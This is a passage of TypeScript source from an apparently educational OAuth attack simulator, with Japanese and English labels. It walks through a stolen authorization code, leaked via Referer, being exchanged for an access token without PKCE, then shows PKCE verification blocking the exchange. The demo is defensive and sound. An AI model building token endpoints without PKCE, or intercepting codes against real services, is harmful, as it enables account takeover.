        sql: "INSERT INTO oauth_tokens (access_token, refresh_token, client_id, user_id, scope, expires_at, is_attack_sim) VALUES (?, ?, ?, ?, ?, ?, 1)",
        params: [accessTokenPreview, "(refresh)", "demo-app", aliceId, "read", expiresAtToken],
        ms: 0,
      });

      trace.addCryptoOp({
        op: "pkce_check_skipped",
        input: "(PKCE not configured on this authorization code)",
        output: "ACCEPTED (脆弱: PKCE なし)",
        algo: "SHA-256",
        detail: "PKCE が設定されていないため、盗んだコードのみでトークン交換が成立しました",
      });

      trace.addCryptoOp({
        op: "jwt.sign(stolen_code_exchange)",
        input: JSON.stringify(jwtSignClaims),
        output: accessTokenPreview,
        algo: "HMAC-SHA256",
        detail: "Stolen authorization code exchanged for access token — no code_verifier required",
      });

      recordStep({
        id: "referer-4",
        kind: "exploit",
        label: "Stolen code exchanged for access token (no PKCE)",
        labelJa: "盗んだコードをアクセストークンに交換 (PKCE なし)",
        status: "success",
        payload: {
          type: "http",
          request: {
            method: "POST",
            url: "/api/oauth/attack/code-via-referer",
            body: {
              stolenCode: stolenCode.substring(0, 8) + "...",
              clientId: "demo-app",
            },
          },
          response: {
            status: 200,
            body: {
              outcome: "succeeded",
              summaryJa: "この実装は脆弱です: PKCE なしの認可コードは傍受後にトークン交換に悪用される可能性があります",
              access_token: accessTokenPreview,
              token_type: "Bearer",
              scope: "read",
            },
          },
        },
        detailJa: "PKCE が設定されていないため、盗んだコードのみでトークン交換が成立します。攻撃者は seed_alice のリソースにアクセスできます。",
        detail: "Without PKCE, the stolen code alone is sufficient for token exchange. The attacker can access seed_alice's resources.",
      });

      // ── Step 5: verify — PKCE があれば code_verifier 欠如でブロック (堅牢モード) ──
      trace.addCryptoOp({
        op: "pkce_verify(S256)",
        input: `code_verifier=MISSING, stored_challenge=${codeChallenge.substring(0, 20)}...`,
        output: "REJECTED — code_verifier required",
        algo: "SHA-256",
        detail: "RFC 7636: code_verifier が提供されなかったため、トークン交換を拒否しました",
      });

      recordStep({
        id: "referer-5",
        kind: "verify",
        label: "PKCE code_verifier check rejects stolen code",
        labelJa: "PKCE の code_verifier 検証が盗まれたコードを拒否",
        status: "blocked",
        payload: {
          type: "http",
          request: {
            method: "POST",
            url: "/api/oauth/attack/code-via-referer",
            body: { stolenCode: stolenCode.substring(0, 8) + "..." },
          },
          response: {
            status: 400,
            body: {
              error: "code_verifier required but not provided",
              blockedBy: "pkce_code_verifier_missing",
              summaryJa: "防御が機能しました: PKCE の code_verifier が欠如しているため、盗んだコードは使用できません",
            },
          },
        },
        detailJa: `PKCE が有効化されている場合、盗んだコードのみではトークン交換できません。攻撃者は code_verifier を知らないため、code_challenge との SHA-256 比較に失敗します。`,
        detail: "When PKCE is enabled, the stolen code alone cannot be exchanged. The attacker doesn't know the code_verifier and fails the SHA-256 comparison against code_challenge.",
      });

      return {
        blockedBy: "pkce_code_verifier_missing",
        summary: "Without PKCE, stolen code was exchanged for an access token (vulnerable). With PKCE, missing code_verifier blocks the exchange (defense worked).",
        summaryJa: "このシナリオでは PKCE なしの認可コードは傍受後にトークン交換に悪用されますが、PKCE (RFC 7636) を使用することで盗んだコードは無効化されます。",
        extra: {
          stolenCode: stolenCode.substring(0, 8) + "...",
          simulatedReferer,
          accessTokenPreview,
          pkceChallengePreview: codeChallenge.substring(0, 20) + "...",
        } satisfies CodeViaRefererExtra,
        payload: {
          params: {},
          result: {
            stolenCodeMasked: maskSecret(stolenCode),
            accessTokenMasked: maskSecret(accessToken),
            pkceChallengePreview: codeChallenge.substring(0, 20) + "...",
          },
        },
      };
    },
  }),
);
